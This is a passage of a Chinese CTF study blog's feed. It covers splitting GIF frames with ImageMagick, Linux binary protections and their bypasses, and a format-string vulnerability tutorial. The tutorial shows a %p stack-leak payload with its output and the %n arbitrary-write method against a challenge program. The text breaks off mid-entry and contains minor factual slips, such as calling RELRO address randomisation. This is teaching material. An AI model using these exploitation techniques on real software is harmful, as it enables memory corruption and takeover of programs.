    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/GIF%E5%9B%BE%E7%89%87%E6%8B%86%E5%88%86&amp;%E6%8B%BC%E5%9B%BE/</id>
    <published>2023-03-19T07:56:04.000Z</published>
    <updated>2023-04-14T08:52:13.856Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Windows-平台"><a href="#Windows-平台" class="headerlink" title="Windows 平台"></a>Windows 平台</h2><h3 id="拆分并拼图"><a href="#拆分并拼图" class="headerlink" title="拆分并拼图"></a>拆分并拼图</h3><blockquote><p>将 GIF 拆分成一帧一帧的片段，并直接将这些片段拼起来在网站上展示一整张图</p></blockquote><ul><li>在线网站：<a href="https://tu.sioe.cn/gj/fenjie/">GIF动态图片分解，多帧动态图分解成多张静态图片</a></li></ul><hr><h3 id="拆分"><a href="#拆分" class="headerlink" title="拆分"></a>拆分</h3><blockquote><p>将 GIF 拆分成一帧一帧的单独文件，可打包下载到本地，但没有拼图的功能</p></blockquote><ul><li>在线网站：<a href="https://uutool.cn/gif2img/">在线GIF图片帧拆分工具 - UU在线工具</a></li></ul><hr><h3 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h3><blockquote><p>配合 <a href="https://uutool.cn/gif2img/">在线GIF图片帧拆分工具 - UU在线工具</a> 使用，先将 GIF 拆分成一个个文件，并置于同一文件夹内，然后使用 ImageMagick 进行拼接</p></blockquote><ul><li>下载：<a href="https://imagemagick.org/script/download.php#windows">图像魔术 – 下载</a></li><li>使用：<ol><li>到需要拼接的图片目录下，调用 <code>cmd</code></li><li>执行命令：<br> <code>magick montage *.png -tile &lt;1x10&gt; -geometry +0+0 flag.png</code> </li><li><strong>注意</strong>：只需修改 <code>&lt;1x10&gt;</code> 的位置 【1x10 表示将该文件夹下的图片拼成一行、每行十张，拼接得到一张大图】</li><li>这里的 <code>-geometry +0+0</code> 表示各个图片之间不需要间隔</li></ol></li></ul><hr><h2 id="Linux-平台"><a href="#Linux-平台" class="headerlink" title="Linux 平台"></a>Linux 平台</h2><h3 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h3><blockquote><p>在 Linux 下，convert 是一款基于 ImageMagick 软件的命令行工具，用于进行图像格式转换、大小调整、旋转、剪切、添加边框、改变图像色彩等操作</p></blockquote><ul><li>使用：<br>  <code>convert &lt;.gif 文件名&gt; &lt;输出路径/flag.png&gt;</code></li></ul><hr><h3 id="montage"><a href="#montage" class="headerlink" title="montage"></a>montage</h3><blockquote><p>在 Linux 下，montage 是基于 ImageMagick 工具集的一个命令行工具，用于将多张图片合成为一张大图</p></blockquote><ul><li>下载安装：<br>  <code>sudo apt-get install graphicsmagick-imagemagick-compat</code></li><li>使用：<ol><li>到需要拼接的图片目录下，打开终端</li><li>执行命令：<br> <code>montage *.png -tile &lt;1x10&gt; -geometry +0+0 flag.png</code></li><li><strong>注意</strong>：只需修改 <code>&lt;1x10&gt;</code> 的位置 【1x10 表示将该文件夹下的图片拼成一行、每行十张，拼接得到一张大图】</li><li>这里的 <code>-geometry +0+0</code> 表示各个图片之间不需要间隔</li></ol></li></ul><hr>]]></content>
    
    
    <summary type="html">做杂项时遇到的一种类型：将 GIF 拆分成帧，再将帧拼接成一张完整的图</summary>
    
    
    
    <category term="杂项" scheme="https://www.4ss1du0us.cn/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>文件保护机制</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</id>
    <published>2023-03-19T07:39:49.000Z</published>
    <updated>2023-04-14T08:53:42.877Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件信息"><a href="#文件信息" class="headerlink" title="文件信息"></a>文件信息</h2><h3 id="查看类型"><a href="#查看类型" class="headerlink" title="查看类型"></a>查看类型</h3><blockquote><p><code>file &lt;文件名&gt;</code></p></blockquote><p><img src="https://s2.loli.net/2023/03/17/7lQIL4sMZbPWdxY.png" alt="CTF - Pwn_文件保护机制1.png"></p><h3 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h3><blockquote><p><strong>Kali：</strong><code>checksec &lt;文件名&gt;</code><br><strong>Ubuntu：</strong><code>checksec --file=&lt;文件名&gt;</code></p></blockquote><p><img src="https://s2.loli.net/2023/03/17/kWEDwX8tOBRQCsZ.png" alt="CTF - Pwn_文件保护机制2.png"></p><hr><h2 id="文件保护机制"><a href="#文件保护机制" class="headerlink" title="文件保护机制"></a>文件保护机制</h2><h3 id="Arch（程序架构信息）"><a href="#Arch（程序架构信息）" class="headerlink" title="Arch（程序架构信息）"></a>Arch（程序架构信息）</h3><blockquote><p>判断文件是 64位 还是 32位，exp 编写是 p64 还是 p32</p></blockquote><blockquote><p><mark>32位</mark>：cpu 一次处理 32位 数据，即 4 字节，相当于地址的宽度，即 <code>sizeof(*p)</code>，虚拟地址大小为 4G，即有 $2^{32}$ 个地址，从 32个0 到 32个1 的地址</p><p><mark>64位</mark>：cpu 一次处理 64位 数据，即 8 字节，相当于地址的宽度，即 <code>sizeof(*p)</code>，虚拟地址大小为 128G，即 $2^{64}$ 个地址，从 64个0 到 64个1 的地址</p></blockquote><h4 id="32-位和-64-位的数据处理"><a href="#32-位和-64-位的数据处理" class="headerlink" title="32 位和 64 位的数据处理"></a>32 位和 64 位的数据处理</h4><ol><li><code>p32()</code> 是对 32 位程序的数据进行打包，转换成二进制的形式，比如转换成地址</li><li><code>p64()</code> 是对 64 位程序的数据进行打包， 处理后形成<strong>小端序</strong>字节码</li><li><code>p32</code>、<code>p64</code> 是打包为二进制；<code>u32</code>、<code>u64</code> 是解包为二进制</li></ol><h4 id="32-位和-64-位的函数调用"><a href="#32-位和-64-位的函数调用" class="headerlink" title="32 位和 64 位的函数调用"></a>32 位和 64 位的函数调用</h4><ul><li><mark>32位</mark> 程序默认调用函数的方式<ol><li>将参数压入栈中</li><li>靠近 call 指令的是第一个参数</li><li>然后 call</li></ol></li><li><mark>64位</mark> 程序默认调用函数的方式<ol><li>RDI 中存放第1个参数</li><li>RSI 中存放第2个参数</li><li>RDX 中存放第3个参数</li><li>RCX 中存放第4个参数</li><li>R8 中存放第5个参数</li><li>R9 中存放第6个参数</li><li>如果还有更多的参数，再把过多那几个参数像32位程序一样压入栈中</li><li>然后call</li></ol></li></ul><hr><h3 id="RELRO（堆栈地址随机化）"><a href="#RELRO（堆栈地址随机化）" class="headerlink" title="RELRO（堆栈地址随机化）"></a>RELRO（堆栈地址随机化）</h3><blockquote><p>用于加强对 binary 数据段的保护的技术</p></blockquote><ul><li>主要针对 GOT 改写的攻击方式：<ol><li><code>Partial RELRO（部分开启，GOT 可写）</code>，易受到攻击，例如攻击者可以 atoi.got 为 system.plt，进而输入&#x2F;bin&#x2F;sh\x00获得shell</li><li><code>Full RELRO（全部开启，GOT 不可写）</code>，使整个 GOT 只读，从而无法被覆盖，意味着无法修改 GOT表。但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号</li></ol></li></ul><hr><h3 id="Stack（Canary-金丝雀）"><a href="#Stack（Canary-金丝雀）" class="headerlink" title="Stack（Canary 金丝雀）"></a>Stack（Canary 金丝雀）</h3><blockquote><p>栈溢出检查，一种用来防护栈溢出的保护机制</p><p><code>Canary found</code> 表示开启了 Canary 保护，不能直接用溢出的方法覆盖栈中返回地址</p></blockquote><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><ol><li>函数每一次执行时，在栈上随机产生一个 Canary 值</li><li>代码一般在函数的入口处，先从 fs&#x2F;gs 寄存器中取出一个4字节（eax）或者8字节（rax）的值存到栈上，逆向题中的代码经常遇见</li><li>当函数结束时，会检查这个栈上的值是否和存进去的值一致；如果不一致，就会停止程序运行，作用相当于校验信息的 cookie</li></ol><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ul><li>一般在覆盖返回地址的时候也会将 Canary 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行。可有通过改写指针与局部变量、leak canary、overwrite canary 的方法来绕过</li></ul><hr><h3 id="NX（栈不可执行）"><a href="#NX（栈不可执行）" class="headerlink" title="NX（栈不可执行）"></a>NX（栈不可执行）</h3><blockquote><p>如果这个保护开启，就意味着栈中数据没有执行权限，程序将数据段和代码段分开了，因此不能将返回地址导向 shellcode 中</p></blockquote><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><ol><li>NX 将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令</li><li>当在堆栈上写入 shellcode 并触发时，只会直接造成程序的崩溃，而不是执行 shellcode</li></ol><h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><ul><li>一般可以利用 rop 的方式绕过</li></ul><hr><h3 id="PIE（位置无关可执行文件）"><a href="#PIE（位置无关可执行文件）" class="headerlink" title="PIE（位置无关可执行文件）"></a>PIE（位置无关可执行文件）</h3><blockquote><p>PIE 在编译时将程序编译为位置无关，程序运行的各个段加载的虚拟地址在装载时确定（地址随机化）</p></blockquote><hr><h3 id="RWX（读写权限）"><a href="#RWX（读写权限）" class="headerlink" title="RWX（读写权限）"></a>RWX（读写权限）</h3><table><thead><tr><th align="left">权限</th><th align="left">解释</th></tr></thead><tbody><tr><td align="left"><strong>r（Read，读取）</strong></td><td align="left">对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目录的权限</td></tr><tr><td align="left"><strong>w（Write，写入）</strong></td><td align="left">对文件而言，具有新增、修改、删除文件内容的权限；对目录来说，具有新建、删除、修改、移动目录内文件的权限</td></tr><tr><td align="left"><strong>x（eXecute，执行）</strong></td><td align="left">对文件而言，具有执行文件的权限；对目录而言该用户具有进入目录的权限</td></tr></tbody></table><ol><li><strong>目录的只读访问不允许使用 <code>cd</code> 进入目录</strong>，必须要有执行的权限才能进入</li><li><strong>只有执行权限只能进入目录，不能看到目录下的内容</strong>；要想看到目录下的文件名和目录名，需要可读权限</li><li><strong>一个文件能不能被删除，主要看该文件所在的目录对用户是否具有写权限</strong>，如果目录对用户没有写权限，则该目录下的所有文件都不能被删除，文件所有者除外</li><li>目录的 <strong>w</strong> 位不设置，即使你拥有目录中某文件的 <strong>w</strong> 权限也不能写该文件</li></ol>]]></content>
    
    
    <summary type="html">对 Linux 下文件保护机制的大致总结</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-03-19T07:39:40.000Z</published>
    <updated>2023-04-14T08:53:39.221Z</updated>
    
    <content type="html"><![CDATA[<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><blockquote><p>格式化字符串漏洞，是由编程时使用 <code>printf</code> 函数，在将数据格式化输出时产生的漏洞</p></blockquote><blockquote><p>其中 <code>*printf()</code> 函数包括 <code>printf</code>，<code>fprintf</code>，<code>sprintf</code>，<code>snprintf</code>，<code>vprintf</code>，<code>vfprintf</code>，<code>vsprintf</code>，<code>vsnprintf</code> 等函数，它们可以将数据格式化后输出</p></blockquote><blockquote><p>一旦程序编写不规范，比如正确的写法是：<code>printf(&quot;%s&quot;, pad)</code>，偷懒写成了：<code>printf(pad)</code>，此时就存在格式化字符串漏洞</p></blockquote><hr><ul><li><p><strong>在 pwn 题中遇到格式化字符串漏洞时，一般会分两大步实现漏洞利用：</strong></p><ol><li>第一步构造一个payload，寻找输入字符串到栈顶指针的偏移</li><li>第二步就是攻击了，利用找到的偏移，在偏移处填入目的地址可以实现目的地址的内容泄露以及内容改写</li></ol></li><li><p><strong>格式化输出说明符</strong><br>  <img src="https://s2.loli.net/2023/03/17/qwXZ6MnSIjRvDLK.png" alt="CTF - Pwn_格式化字符串漏洞1.png"></p><ol><li><code>%n</code> 是一个不常见的格式化字符串，可以将一个 <code>int</code> 型的值（4字节）写入指定的地址中，这将可以实现栈空间的随意改写</li><li>除了 <code>%n</code>，还有 <code>%hn</code>、<code>%hhn</code>、<code>%lln</code>，分别为写入目标空间 2字节、1字节、8字节，这里的字节对应的是参数的地址开始的几字节</li></ol></li></ul><hr><h3 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h3><blockquote><p><code>printf()</code> 并不是一般的函数，它是 C 语言中少有的支持可变参数的库函数。所以，在被调用之前，被调用者无法知道函数调用之前有多少个参数被压入栈中。所以，<code>printf</code> 函数要求传入一个 <code>format</code> 参数以指定参数的数量和类型，然后 <code>printf</code> 函数就会严格的按照 <code>format</code> 参数所规定的格式逐个从栈中取出并输出参数</p></blockquote><ol><li>示例一<ul><li><code>printf(&quot;%s %s %s %s %s\n&quot;, str1,str2,str3,str4,str5)</code></li><li><strong>若 <code>printf</code> 函数中低于 6个 参数，则直接将值传给寄存器，按照参数的顺序，从左到右依次为 <code>edi</code>，<code>rsi</code>，<code>rdx</code>，<code>rcx</code>，<code>r8</code>，<code>r9</code></strong></li></ul></li><li>示例二<ul><li><code>printf(&quot;%s %s %s %s %s %s %s %s %s %s %s\n&quot;, str1,str2,str3,str4,str5,str6,str7,str8,str9,str10,str11)</code></li><li><strong>若 <code>printf</code> 函数中多于 6个 参数，从 第七个 参数才开始压栈</strong></li></ul></li></ol><hr><h3 id="关于-的用法"><a href="#关于-的用法" class="headerlink" title="关于 $ 的用法"></a>关于 $ 的用法</h3><blockquote><p><code>$</code> 号是用来指定参数的</p></blockquote><ul><li>示例一，**<code>$n</code> 演示：**<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"hello "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"world "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str3<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"I "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str4<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"am "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str5<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"Tom "</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%2$s %s %s %s %s %s\n"</span><span class="token punctuation">,</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">,</span>str3<span class="token punctuation">,</span>str4<span class="token punctuation">,</span>str5 <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>输出：<br>  world hello world I am Tom</li></ul><blockquote><p>通过 <code>%n$p</code>，合理控制 <code>n</code> 就能获取栈中数据</p></blockquote><hr><h3 id="关于-n-的用法"><a href="#关于-n-的用法" class="headerlink" title="关于 %n 的用法"></a>关于 %n 的用法</h3><blockquote><p>向指定的地址中写入已经输出的字节个数</p></blockquote><ul><li><strong><code>%n</code> 演示：</strong><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"111111"</span><span class="token punctuation">;</span><span class="token keyword">char</span> str2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"222222"</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%%48c%2$hhn \n"</span><span class="token punctuation">,</span>str1<span class="token punctuation">,</span>str2 <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c %c %c %c\n"</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>输出：<br>  %48c<br>  4 32 32 32</li></ul><hr><table><thead><tr><th align="left">目的</th><th align="left">实现</th></tr></thead><tbody><tr><td align="left">读取栈上某地址的大概格式</td><td align="left"><code>%%参数顺序$类型n</code>，譬如：<code>%7$lx</code>，就是以 <code>lx</code> 格式读 第7个 参数的值</td></tr><tr><td align="left">做写入的一般格式</td><td align="left"><code>%%数值c%参数顺序$类型</code>，譬如说：<code>%%40c%5$hhn</code>，就是向 第5个 参数写入 40 这个数值</td></tr></tbody></table><hr><ul><li><strong>如果给出的 <code>format</code> 参数的个数 &gt; 待输出的参数数量</strong><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %d %d %d %d %x %x"</span><span class="token punctuation">,</span><span class="token string">"num"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>输出：<br>  1 2 3 33 test 1a1390 4013e8</li></ul><blockquote><p>虽然给了 7个 格式化输出的参数，但是实际压入栈中的参数只有 5个，所以，<code>printf</code> 会输出两个本不应该输出的地址内容，借助这个漏洞，我们就泄露出了栈中的数据</p></blockquote><hr><h2 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h2><h3 id="泄露任意地址内容"><a href="#泄露任意地址内容" class="headerlink" title="泄露任意地址内容"></a>泄露任意地址内容</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please tell me your name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">0xAu</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"leave your message please:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v8<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello %s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"your message is:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> pwnme <span class="token operator">==</span> <span class="token number">8</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you pwned me, here is your flag:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Thank you!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>看到第7行，<code>printf</code> 输出了在前面输入的 <code>v8</code> 变量，但是并没有给出任何格式化参数，所以我们可以通过构造 <code>v8</code> 的值来让 <code>printf</code> 误以为程序给出了格式化参数，从而按照我们的意思输出我们所需的值</p></blockquote><ul><li>输出：<br>  <em>please tell me your name:</em><br>  <code>aaaa</code><br>  <em>leave your message please:</em><br>  <code>AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</code><br>  <em>hello aaaa</em><br>  <em>your message is:</em><br>  <code>AAAA 0xffffd13e 0xf7fae580 0xffffd19c 0xf7ffdae0 0x1 0xf7fcb410 0x61610001 0xa6161 (nil) 0x41414141 0x25207025 0x70252070 0x20702520 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025</code><br>  <em>Thank you!</em></li></ul><blockquote><p>显然，程序泄露出了我们想要知道的 <code>printf</code> 函数的栈帧中输出字符串后 19个 内存单元的值，理论上来说，我们可以使用这个漏洞来进行任意读取栈中的值</p></blockquote><hr><h3 id="修改任意地址值"><a href="#修改任意地址值" class="headerlink" title="修改任意地址值"></a>修改任意地址值</h3><blockquote><p>任意地址写就要用到 <code>%n</code> 了</p></blockquote><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the usage of %n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"c = %d\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>输出：<br>  c &#x3D; 13</li></ul><blockquote><p>就是说，**<code>%n</code> 参数把他前面输出的字符数赋值给了变量 <code>c</code>**，因此，只要更改 <code>c</code> 所对应栈中的地址就可以把想要的数值赋给对应地址</p></blockquote><hr><h3 id="printf-的栈结构"><a href="#printf-的栈结构" class="headerlink" title="printf 的栈结构"></a>printf 的栈结构</h3><h2 id="把先前输出字符的总长度赋值给了参数-4-所对应的地址，也就是说，只要控制前面输出的长度就可以控制该参数所对应地址的值了-要想控制-参数4-的值，就要用到-printf-的另外一个特性：-操作符。这个操作符可以输出指定位置的参数-假如格式化输出参数是-6-n-的话，就把之前输出的长度赋值给-printf-函数的-第6个-参数，但是-printf-函数根本不知道自己的栈有多大，所以只需要把这个偏移数值定位到能够修改的内存空间-1-例如，把这个偏移数值定位到题目中的-v8-变量所在地址-2-获取偏移量，通过查看前面构造的偷看任意位置内存空间的输入运行结果：-AAAA-0xffffd13e-0xf7fae580-0xffffd19c-0xf7ffdae0-0x1-0xf7fcb410-0x61610001-0xa6161-nil-0x41414141-0x25207025-0x70252070-0x20702520-0x20207025-0x20207025-0x20207025-0x20207025-0x20207025-0x20207025-3-看到-39-0x41414141-39-，就是输入的-AAAA，也就是说，可以控制的内存空间相对位置在-printf-函数的-第10个-参数位置-其实-printf-函数根本没有这么多个参数，只不过他自己并不知道；从-AAAA-到-0x41414141-还有-九个-输出值，所以-v8-在相对-第10个-参数位置"><a href="#把先前输出字符的总长度赋值给了参数-4-所对应的地址，也就是说，只要控制前面输出的长度就可以控制该参数所对应地址的值了-要想控制-参数4-的值，就要用到-printf-的另外一个特性：-操作符。这个操作符可以输出指定位置的参数-假如格式化输出参数是-6-n-的话，就把之前输出的长度赋值给-printf-函数的-第6个-参数，但是-printf-函数根本不知道自己的栈有多大，所以只需要把这个偏移数值定位到能够修改的内存空间-1-例如，把这个偏移数值定位到题目中的-v8-变量所在地址-2-获取偏移量，通过查看前面构造的偷看任意位置内存空间的输入运行结果：-AAAA-0xffffd13e-0xf7fae580-0xffffd19c-0xf7ffdae0-0x1-0xf7fcb410-0x61610001-0xa6161-nil-0x41414141-0x25207025-0x70252070-0x20702520-0x20207025-0x20207025-0x20207025-0x20207025-0x20207025-0x20207025-3-看到-39-0x41414141-39-，就是输入的-AAAA，也就是说，可以控制的内存空间相对位置在-printf-函数的-第10个-参数位置-其实-printf-函数根本没有这么多个参数，只不过他自己并不知道；从-AAAA-到-0x41414141-还有-九个-输出值，所以-v8-在相对-第10个-参数位置" class="headerlink" title="- 把先前输出字符的总长度赋值给了参数 4 所对应的地址，也就是说，只要控制前面输出的长度就可以控制该参数所对应地址的值了- 要想控制 参数4 的值，就要用到 printf 的另外一个特性：$ 操作符。这个操作符可以输出指定位置的参数- 假如格式化输出参数是 %6$n 的话，就把之前输出的长度赋值给 printf 函数的 第6个 参数，但是 printf 函数根本不知道自己的栈有多大，所以只需要把这个偏移数值定位到能够修改的内存空间    1. 例如，把这个偏移数值定位到题目中的 v8 变量所在地址    2. 获取偏移量，通过查看前面构造的偷看任意位置内存空间的输入运行结果：        AAAA 0xffffd13e 0xf7fae580 0xffffd19c 0xf7ffdae0 0x1 0xf7fcb410 0x61610001 0xa6161 (nil) 0x41414141 0x25207025 0x70252070 0x20702520 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025    3. 看到 &#39;0x41414141&#39;，就是输入的 AAAA，也就是说，可以控制的内存空间相对位置在 printf 函数的 第10个 参数位置        - 其实 printf 函数根本没有这么多个参数，只不过他自己并不知道；从 AAAA 到 0x41414141 还有 九个 输出值，所以 v8 在相对 第10个 参数位置"></a><img src="https://s2.loli.net/2023/03/17/Gb6ugVmROpPU1or.png" alt="CTF - Pwn_格式化字符串漏洞2.png"><br>- 把先前输出字符的总长度赋值给了参数 4 所对应的地址，也就是说，只要控制前面输出的长度就可以控制该参数所对应地址的值了<br>- 要想控制 参数4 的值，就要用到 <code>printf</code> 的另外一个特性：<code>$</code> 操作符。这个操作符可以输出指定位置的参数<br>- 假如格式化输出参数是 <code>%6$n</code> 的话，就把之前输出的长度赋值给 <code>printf</code> 函数的 第6个 参数，但是 <code>printf</code> 函数根本不知道自己的栈有多大，所以只需要把这个偏移数值定位到能够修改的内存空间<br>    1. 例如，把这个偏移数值定位到题目中的 v8 变量所在地址<br>    2. 获取偏移量，通过查看前面构造的偷看任意位置内存空间的输入运行结果：<br>        <code>AAAA 0xffffd13e 0xf7fae580 0xffffd19c 0xf7ffdae0 0x1 0xf7fcb410 0x61610001 0xa6161 (nil) 